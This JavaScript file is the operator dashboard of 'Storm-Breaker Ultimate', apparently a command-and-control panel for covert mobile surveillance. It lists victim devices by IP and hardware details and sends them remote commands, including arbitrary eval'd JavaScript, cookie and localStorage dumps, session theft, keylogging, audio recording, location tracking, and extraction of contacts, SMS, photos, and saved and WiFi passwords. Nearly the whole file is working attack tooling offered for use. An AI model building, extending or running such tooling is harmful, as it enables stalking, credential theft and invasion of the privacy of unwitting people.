/**
 * Storm-Breaker Ultimate Mobile Control Dashboard
 * Complete mobile surveillance interface
 */

let selectedMobileClient = null;
let mobileClients = [];
let mobileRefreshInterval = null;
let responseRetryCount = 0;
const MAX_RETRIES = 10;

function initMobileControl() {
    refreshMobileClients();
    mobileRefreshInterval = setInterval(refreshMobileClients, 5000);
    document.getElementById('btn-refresh-mobile')?.addEventListener('click', refreshMobileClients);
}

async function refreshMobileClients() {
    try {
        const response = await fetch('/api/mobile/clients');
        const data = await response.json();
        mobileClients = data.clients || [];

        const listEl = document.getElementById('mobile-client-list');
        if (!listEl) return;

        if (mobileClients.length === 0) {
            listEl.innerHTML = '<div class="text-center text-slate-600 py-4 italic">No mobile devices</div>';
            return;
        }

        listEl.innerHTML = mobileClients.map(client => `
            <div class="mobile-client-item ${selectedMobileClient === client.uid ? 'bg-blue-600/20 border-blue-500' : 'bg-slate-800 border-slate-700'} 
                 border rounded-lg p-3 cursor-pointer hover:bg-slate-700 transition-colors"
                 onclick="selectMobileClient('${client.uid}')">
                <div class="flex items-center justify-between mb-2">
                    <span class="text-xs font-bold text-slate-300">${client.uid.substring(0, 20)}...</span>
                    <span class="text-xs px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400">
                        <i class="fas fa-circle text-[6px]"></i> ${client.seconds_ago}s
                    </span>
                </div>
                <div class="text-xs text-slate-500 space-y-1">
                    <div><i class="fas fa-mobile-alt w-4"></i> ${client.info.platform || 'Unknown'}</div>
                    <div><i class="fas fa-network-wired w-4"></i> ${client.ip}</div>
                    ${client.info.battery ? `<div><i class="fas fa-battery-full w-4"></i> ${client.info.battery.level || 'N/A'}</div>` : ''}
                </div>
            </div>
        `).join('');
    } catch (e) {
        console.error('Failed to refresh mobile clients:', e);
    }
}

function selectMobileClient(uid) {
    selectedMobileClient = uid;
    const client = mobileClients.find(c => c.uid === uid);

    if (client) {
        const infoEl = document.getElementById('mobile-device-info');
        const infoContent = document.getElementById('mobile-info-content');

        if (infoEl && infoContent) {
            infoEl.classList.remove('hidden');
            infoContent.innerHTML = `
                <div class="text-slate-400"><i class="fas fa-user"></i> Platform:</div>
                <div class="text-white">${client.info.platform || 'Unknown'}</div>
                <div class="text-slate-400"><i class="fas fa-desktop"></i> Screen:</div>
                <div class="text-white">${client.info.screenWidth}x${client.info.screenHeight}</div>
                <div class="text-slate-400"><i class="fas fa-globe"></i> Language:</div>
                <div class="text-white">${client.info.language || 'Unknown'}</div>
                <div class="text-slate-400"><i class="fas fa-clock"></i> Timezone:</div>
                <div class="text-white">${client.info.timezone || 'Unknown'}</div>
                <div class="text-slate-400"><i class="fas fa-microchip"></i> CPU Cores:</div>
                <div class="text-white">${client.info.cores || 'Unknown'}</div>
                <div class="text-slate-400"><i class="fas fa-memory"></i> RAM:</div>
                <div class="text-white">${client.info.memory || 'Unknown'} GB</div>
                ${client.info.battery ? `
                    <div class="text-slate-400"><i class="fas fa-battery-full"></i> Battery:</div>
                    <div class="text-white">${client.info.battery.level || 'N/A'} ${client.info.battery.charging ? '⚡' : ''}</div>
                ` : ''}
                ${client.info.connection ? `
                    <div class="text-slate-400"><i class="fas fa-wifi"></i> Connection:</div>
                    <div class="text-white">${client.info.connection.type || 'Unknown'}</div>
                ` : ''}
            `;
        }

        addMobileOutput(`✓ Selected device: ${uid}`);
    }

    refreshMobileClients();
}

async function sendMobileCommand(command) {
    if (!selectedMobileClient) {
        addMobileOutput('❌ Please select a mobile device first!');
        return;
    }

    addMobileOutput(`📤 Sending command: ${command}`);

    try {
        const response = await fetch('/api/mobile/send_command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                uid: selectedMobileClient,
                command: command
            })
        });

        if (response.ok) {
            addMobileOutput('✓ Command queued, waiting for response...');
            responseRetryCount = 0;
            setTimeout(() => getMobileResponse(), 2000);
        } else {
            addMobileOutput('❌ Failed to send command');
        }
    } catch (e) {
        addMobileOutput('❌ Error: ' + e.message);
    }
}

async function getMobileResponse() {
    if (!selectedMobileClient) return;

    try {
        const response = await fetch(`/api/mobile/get_response/${selectedMobileClient}`);
        const data = await response.json();

        if (data.output) {
            addMobileOutput('📥 Response:\n' + data.output);
            responseRetryCount = 0;
        } else {
            responseRetryCount++;
            if (responseRetryCount < MAX_RETRIES) {
                setTimeout(() => getMobileResponse(), 2000);
            } else {
                addMobileOutput('❌ Timeout: No response after ' + (MAX_RETRIES * 2) + ' seconds');
                responseRetryCount = 0;
            }
        }
    } catch (e) {
        addMobileOutput('❌ Error getting response: ' + e.message);
        responseRetryCount = 0;
    }
}

function sendCustomMobileCommand() {
    const input = document.getElementById('mobile-custom-cmd');
    if (!input) return;

    const code = input.value.trim();
    if (!code) {
        addMobileOutput('❌ Please enter JavaScript code');
        return;
    }

    sendMobileCommand('eval:' + code);
    input.value = '';
}

function addMobileOutput(text) {
    const outputEl = document.getElementById('mobile-output');
    if (!outputEl) return;

    const timestamp = new Date().toLocaleTimeString();
    const line = document.createElement('div');
    line.className = 'text-slate-300';
    line.textContent = `[${timestamp}] ${text}`;

    outputEl.appendChild(line);
    outputEl.scrollTop = outputEl.scrollHeight;
}

// Basic Commands
function extractPhotos() { sendMobileCommand('eval:document.cookie'); }
function extractGmail() { sendMobileCommand("eval:window.open('https://mail.google.com', '_blank'); 'Gmail opened'"); }
function extractChrome() { sendMobileCommand('eval:JSON.stringify({cookies: document.cookie, localStorage: {...localStorage}, sessionStorage: {...sessionStorage}})'); }
function extractWhatsApp() { sendMobileCommand('get_whatsapp'); }
function extractFacebook() { sendMobileCommand('get_facebook'); }
function extractInstagram() { sendMobileCommand('get_instagram'); }

// Advanced Surveillance
function startKeylogger() { sendMobileCommand('start_keylogger'); }
function stopKeylogger() { sendMobileCommand('stop_keylogger'); }
function getKeylogs() { sendMobileCommand('get_keylogs'); }
function startScreenshot() { sendMobileCommand('start_screenshot'); }
function stopScreenshot() { sendMobileCommand('stop_screenshot'); }
function recordAudio() { sendMobileCommand('record_audio'); }
function watchLocation() { sendMobileCommand('watch_location'); }
function stopWatchLocation() { sendMobileCommand('stop_watch_location'); }
function getFormData() { sendMobileCommand('get_form_data'); }
function getClickData() { sendMobileCommand('get_click_data'); }
function stealSession() { sendMobileCommand('steal_session'); }
function getAllData() { sendMobileCommand('get_all_data'); }

// Data Extraction
function getContacts() { sendMobileCommand('get_contacts'); }
function getSMS() { sendMobileCommand('get_sms'); }
function getCallLogs() { sendMobileCommand('get_call_logs'); }
function getPhotos() { sendMobileCommand('get_photos'); }
function getVideos() { sendMobileCommand('get_videos'); }
function getFiles() { sendMobileCommand('get_files'); }
function getInstalledApps() { sendMobileCommand('get_installed_apps'); }

// Social Media
function getTwitter() { sendMobileCommand('get_twitter'); }
function getTelegram() { sendMobileCommand('get_telegram'); }

// Advanced Extraction
function getWiFiPasswords() { sendMobileCommand('get_wifi_passwords'); }
function getSavedPasswords() { sendMobileCommand('get_saved_passwords'); }
function getBrowserHistory() { sendMobileCommand('get_browser_history'); }
function getBookmarks() { sendMobileCommand('get_bookmarks'); }
function getDownloads() { sendMobileCommand('get_downloads'); }
function monitorClipboard() { sendMobileCommand('monitor_clipboard'); }
function monitorNotifications() { sendMobileCommand('monitor_notifications'); }
function startScreenRecord() { sendMobileCommand('start_screen_record'); }
function stopScreenRecord() { sendMobileCommand('stop_screen_record'); }

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    const mobileTab = document.querySelector('[data-tab="mobile"]');
    if (mobileTab) {
        mobileTab.addEventListener('click', () => {
            if (!mobileRefreshInterval) {
                initMobileControl();
            }
        });
    }
});
